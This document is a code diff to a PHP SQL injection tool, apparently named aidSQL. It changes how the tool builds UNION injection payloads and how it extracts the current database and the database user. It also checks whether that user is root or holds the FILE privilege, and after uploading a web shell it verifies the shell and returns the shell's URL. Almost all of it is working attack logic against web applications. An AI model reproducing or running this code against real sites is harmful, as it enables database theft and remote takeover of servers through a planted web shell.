@@ -299,7 +299,6 @@
 					}
 				}
 
-
 			}
 
 			/**
@@ -308,14 +307,12 @@
 
 			public function unionQuery($value,$from=NULL,Array $where=array(),Array $group=array()){
 				
+				$this->buildUnionInjection($value,$from,$where,$group);
+
 				$params	=	$this->_injection;
 				$sql		=	$this->_queryBuilder->getSQL();
 				$sql		=	$params["requestValue"].$params["payload"].$this->_queryBuilder->getSpaceCharacter().$sql.$params["comment"];
-
 				$this->_queryBuilder->setSQL($sql);
-
-				$this->buildUnionInjection($value,$from,$where,$group);
-
 				return parent::query($params["requestVariable"],__FUNCTION__);
 
 			}
@@ -415,9 +412,23 @@
 				$currentDatabase		=	$this->unionQuery("DATABASE()");
 				$currentDatabase		=	$currentDatabase[0];
 
+				if(!$currentDatabase){
+
+					$this->log("WARNING: COULDNT GET CURRENT DATABASE",2,"yellow");
+
+					if($this->_config["all"]["wanted-schemas"]=="{current}"){
+
+						$this->log("ERROR: You have chosen to fetch *ONLY* the current database schema, however aidSQL cannot determine the schema in use, try using --wanted-schemas=\"{all}\" next time",1,"light_red");
+						return FALSE;
+
+					}
+
+				}
+
 				switch($this->_config["all"]["wanted-schemas"]){
 
 					case "{current}":
+
 						$injection	=	NULL;
 						$databases	=	$currentDatabase;
 						break;
@@ -641,8 +652,16 @@
 
 			public function getUser(){
 
+				static $user	=	NULL;
+
+				if($user){
+					return $user;
+				}
+
 				$callback	=	$this->_injection["callback"];
-				return $this->$callback("USER()");
+				$this->log("Fetching database user ...",0,"light_green");
+				$user			=	$this->$callback("USER()");
+				return $user;
 
 			}
 
@@ -660,55 +679,41 @@
 
 			}
 
-			public function isRoot($dbUser=NULL,\aidSQL\http\Adapter &$adapter=NULL){
-
-				if(empty($dbUser)){
-					throw(new \Exception("Database user passed was empty, cant check if its root or not!"));
+			public function isRoot($user=NULL){
+			
+				if(!$user){
+					$user	=	$this->getUser();
+					$user	=	$user[0];
 				}
 
-				if(!strpos($dbUser,"@")){
-					throw (new \Exception("No @ found at database user!!!????"));
-				}
+				$isRoot	=	substr($user,0,strpos($user,'@'));
 
-				$user = substr($dbUser,0,strpos($dbUser,"@"));
-
-				if(strtolower($user)=="root"){
+				if($isRoot=="root"){
+					$this->log("USER RUNNING THIS DATABASE IS ROOT!",0,"light_green");
 					return TRUE;
 				}
 
-				$this->log("User is not root perse, looking up information_schema for file_priv",2,"yellow");
+				$this->log("USER IS NOT ROOT, CHECKING FILE PRIV",0,"light_red");
+				$checkFilePriv	=	$this->checkPrivilege($user);
 
-				//Check for the file privilege user permissions for writing
-				//What it really takes to get a shell is the file writing privilege
-
-				$filePrivilege	=	$this->checkPrivilege("file_priv",$dbUser);
-				return $this->analyzeInjection($filePrivilege);
-
-			}
-
-			private function checkPrivilege($privilege,$user=NULL){
-
-				$privilege			=	\String::hexEncode($privilege);
-				$fieldInjection	=	"is_grantable";
-
-				if(is_null($user)){
-
-					$tableInjection	=	"FROM information_schema.user_privileges ".
-					"WHERE privilege_type=0x66696c65 ".
-					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX(USER(),0x40,1),0x27,0x40".
-					",0x27,SUBSTRING_INDEX(USER(),0x40,-1),0x27)";
-
-				}else{
-
-					$user					=	\String::hexEncode($user);
-					$tableInjection	=	"FROM information_schema.user_privileges ".
-					"WHERE privilege_type=0x66696c65 ".
-					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX($user,0x40,1),0x27,0x40".
-					",0x27,SUBSTRING_INDEX($user,0x40,-1),0x27)";
-
+				if($checkFilePriv){
+					return TRUE;
 				}
 
-				return $this->generateInjection($fieldInjection,$tableInjection);
+				return FALSE;
+				
+			}
+
+			private function checkPrivilege($user,$privilege="FILE"){
+
+				$user			=	explode('@',$user);
+				$user			=	\String::hexEncode("'".$user[0]."'@'".$user[1]."'");
+				$privilege	=	\String::hexEncode($privilege);
+				$select		=	"PRIVILEGE_TYPE";
+				$from			=	"information_schema.user_privileges";
+				$where		=	array("privilege_type=$privilege","AND","GRANTEE=$user");
+				$callback	=	$this->_injection["callback"];
+				return $this->$callback($select,$from,$where);
 
 			}
 
@@ -802,14 +807,16 @@
 
 							$this->_queryBuilder->setSQL($sql);
 
-							parent::query($this->_injection["requestVariable"]);
+							$gotShell	=	parent::query($this->_injection["requestVariable"]);
+							$shellUrl	=	new \aidSQL\core\URL($shellWebLocation);
+							$this->_httpAdapter->setUrl($shellUrl);
+							$parser		=	parent::getParser();
+							$gotShell	=	$parser->analyze($this->_httpAdapter->fetch());
 
-							$testUrl	=	new \aidSQL\core\Url($shellWebLocation);
-							$this->_httpAdapter->setUrl($testUrl);
-							$contents	=	$this->_httpAdapter->fetch();
-
-							//if(\String::hexEncode($contents)==$this->
-							
+							if($gotShell){
+								$this->_httpAdapter->setUrl($restoreUrl);
+								return $shellUrl;
+							}
 
 						}	
 
